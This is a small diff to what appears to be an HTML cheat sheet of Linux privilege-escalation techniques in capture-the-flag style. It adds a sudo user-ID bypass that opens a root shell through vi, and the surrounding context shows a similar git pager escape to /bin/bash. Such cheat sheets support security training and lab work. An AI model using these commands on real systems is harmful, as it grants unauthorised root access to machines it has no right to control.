@@ -193,6 +193,9 @@ Heres a lists of a few programs that can be used to privesc, for more check the 
 
 <li>https://gtfobins.github.io/</li>
 
+<h2>sudo</h2>
+
+<b>hacked-account@victim:~: </b><code>sudo -u#-1 /usr/bin/vi /home/hacked-account/user.txt</code> followed by shift+: <code>!/bin/bash</code>
 
 <h2>bash</h2>
 
@@ -211,7 +214,6 @@ Heres a lists of a few programs that can be used to privesc, for more check the 
 <h2>git</h2>
 
 <b>hacked-account@victim:~: </b><code> sudo git -p help config</code> followed by <b>shift+:</b> and Command> <code>/bin/bash</code>
-
 
 <h2>iftop</h2>
 
